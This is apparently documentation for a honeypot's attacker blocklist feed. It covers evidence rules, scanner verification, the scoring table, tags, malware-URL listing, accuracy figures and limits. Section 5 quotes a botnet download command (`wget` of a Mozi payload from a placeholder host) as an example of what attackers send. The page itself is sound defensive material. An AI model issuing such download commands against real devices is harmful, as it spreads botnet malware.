# How the feed decides

Every rule that puts an address on a list is a table or a few lines of arithmetic in
[`uninvited/intel.py`](../uninvited/intel.py) and [`uninvited/feeds.py`](../uninvited/feeds.py). There is no model in the path, so you
can read the code and know why a host got a tag, a score or a place on a list. This page is that code in prose,
including where it is weak.

## 1. What counts as evidence

**Only completed TCP sessions count.** A UDP source address can be forged by anyone, so a UDP packet proves nothing
about who sent it. SIP over UDP is recorded on the dashboard and never published. A completed TCP handshake cannot be
forged from a third party's address, so a host on a list really did connect.

**A bare connection is not an attack.** Connecting and leaving is recorded as a *scan* and does not count. What counts as
an *engaged event*: a username or password tried, a request that named an exploit, a relay probe, a protocol request
that parsed (Modbus, S7, EtherNet/IP, DNP3), an RDP connection request. An address is listed after **three** engaged events.

**Scanners are kept apart.** Shodan, Censys, BinaryEdge and the other internet-wide research scanners are put on their own
list (`research-*`) and never on the attacker list, because a blocklist that contains Censys is a blocklist people stop
trusting. Tor exits are a third list.

## 2. Who is a research scanner (and how that is kept honest)

A reverse DNS name is a *claim*, not a fact: whoever controls the reverse zone of an address can write anything in it,
so naming your attacking host `census1.shodan.io` would get you off the attacker list. So:

| Evidence | Treated as |
|---|---|
| The address is in a known scanner range | research scanner. An address needs no name. |
| A name under the operator's own domain that **resolves forward to the same address** | research scanner, *confirmed* |
| A name under the operator's own domain that does not resolve forward | research scanner, *provisional*. Some real operators (BinaryEdge, IPIP) publish no forward records. A provisional scanner is demoted to an attacker, permanently, the moment it tries a password, sends a named exploit or writes to a controller. No research scanner does. |
| A generic word in a name (`scanner`, `internet-measurement`) | research scanner only if the name is confirmed. Anyone can put a generic word in a name of their own. |

Measured on the live research list (384 hosts, 2026-10-02): 337 had a confirmed name, 18 had a name that did not resolve
forward (BinaryEdge, IPIP, a few Shodan hosts), 28 had no name at all, 1 resolved to a different address.

The same confirmation protects the never-list (Googlebot, Bingbot, Applebot): a name under those domains protects an
address only when it resolves back.

**Never listed, whatever they do:** private and shared address space, the big public resolvers, confirmed search crawlers,
and anything under `feed.exclude` in the configuration (put your own address there).

## 3. The score (0 to 100)

Four signals, each capped, so the number can be explained in one sentence. Volume, breadth and exploits are counted over
the trailing 30 days; persistence is the address's whole history with this honeypot.

| Signal | Points | Threshold |
|---|---|---|
| volume | 10 / 20 / 30 / 40 | 3 / 10 / 50 / 200 engaged events |
| breadth | 10 / 20 | 2 / 3 or more different protocols engaged |
| persistence | 5 / 10 / 20 | seen over 1 / 3 / 7 or more days |
| exploits | 20 | at least one named exploit |

A *named* exploit is a request that matches a signature for a specific vulnerability or tool. Looking is not exploiting:
proxy hunting, camera probing, MCP endpoint discovery, a TLS handshake sent to a web port and a plain `GET /` add nothing.

`attackers-high-*` is score 60 or higher. The score is a ranking aid, not a probability.

## 4. Tags, techniques and expiry

- **Tags** say what a host did in plain words (`ssh-bruteforce`, `telnet-bruteforce`, `rdp-scan`, `web-exploit`,
  `malware-delivery`, `ics-write`, `camera-exploit`, `ai-endpoint-abuse`, `persistent`, `multi-service`, ...). The full list,
  with meanings, is in `/feed/index.json` under `tag_meanings`.
- **ATT&CK ids** come from the same evidence: T1110 for credential guessing, T1190 for a named exploit, T1105 for a download
  command, T1021.001 for RDP, T1595 for scanning, and the ATT&CK for ICS ids T1692.001, T0888, T0801, T0858 and T0843 for
  industrial protocol activity. Each id was looked up on attack.mitre.org before it was used.
- **CVE ids** appear only when a request matches *exactly one* vulnerability. A signature that covers a family of devices
  gets a technique and no CVE.
- **Host type** (`hosting`, `isp`, `unknown`) is a guess from the network and reverse DNS names, and it is labelled as a
  guess. A hosting address is usually one customer's server, so blocking it is low risk. A consumer ISP address can be
  shared or reassigned next week, so it gets a shorter expiry and a `collateral_risk` of `medium`.
- **Expiry** (`expires`) is advisory: how long to keep the entry in your own copy after the host was last seen. 7 days for
  hosting, 3 for consumer ISPs, 5 when unknown, 50% longer for high-score hosts.

## 5. Malware download URLs

Where the attacker lists name hosts that attacked, the `malware-urls-*` lists name the infrastructure behind the attacks.
A botnet that exploits a camera or router sends a shell command in the same request (`wget http://<ip>:<port>/Mozi.a`), and
the address it downloads from is what the request is for.

**Nothing is ever fetched.** Not by the honeypot, not by the feed builder. A URL is listed because attackers *asked for* it,
not because anyone looked at what it serves, so the list says what it knows and no more. The file name only hints at a
malware family (`family_hint`).

A URL is listed when **two different hosts delivered it**, or the host that delivered it **is** the host it points at (the
common botnet case: an infected device offering its own copy). One request therefore cannot get a legitimate address
listed: that takes two sources, and the second rule cannot be aimed at a third party. Never listed: private and reserved
addresses, `feed.exclude`, and the big platforms in `intel.NEVER_DOMAINS`. Confidence is 50 for one delivering host, 65 for
two, 80 for three, 95 for four or more.

## 6. Measured accuracy

The page and `/feed/index.json` publish how well the attacker list predicts the future, computed from the raw table so it
can be checked: of the hosts that qualified for the list a day ago, what share attacked this server again within 24 hours,
and the same for a week. On 2026-10-02:

| Of hosts listed | came back within |  |
|---|---|---|
| a day ago (225) | 24 hours | 38% |
| a week ago (1,052) | 7 days | 26% |
| and already on record 7+ days (101 and 251) | 24 hours and 7 days | 70% and 61% |

Two honest readings. First, **persistence is the strong signal**: a host that has been around a week is far more likely
to come back than one that just qualified, which is why `tag-persistent-7d` is the list to block from. Second, **these are
floors**: one server sees a small slice of the internet, so a host that did not come back here may well have kept attacking
somewhere else. A single sensor cannot measure that, and the page says so.

## 7. What this cannot tell you

- **One sensor.** The numbers describe what reached one server on one residential connection. They are not a census.
- **Attackers rotate.** Many hosts are one-day wonders (rented VPS, compromised devices). The expiry exists for this.
- **Shared addresses.** Carrier-grade NAT and consumer ISPs put many people behind one address.
- **A listing is not an attribution.** Hosts that share a credential list or an SSH client fingerprint share *tooling*, not
  necessarily an operator. Public wordlists mean unrelated people run identical credentials.
- **A classification is a rule, not a verdict.** If you disagree with one, report the address (the page has a form) or open
  an issue with the request that was misclassified. Real traffic is how every signature in this project was written.

## 8. Reproducing a number

Everything on a list can be recomputed from the `knocks` table in the SQLite database. For example, hosts with at least
three engaged events in the last 7 days:

```sql
SELECT ip, COUNT(*) AS engaged
FROM knocks
WHERE ts >= strftime('%s','now') - 7*86400
  AND COALESCE(json_extract(detail, '$.scan'), 0) != 1
  AND COALESCE(json_extract(detail, '$.source'), '') != 'udp'
GROUP BY ip HAVING engaged >= 3 ORDER BY engaged DESC;
```

The feed builder does exactly this (plus the exclusions above) every five minutes, from a read-only connection, so a slow
rebuild never delays the honeypot.
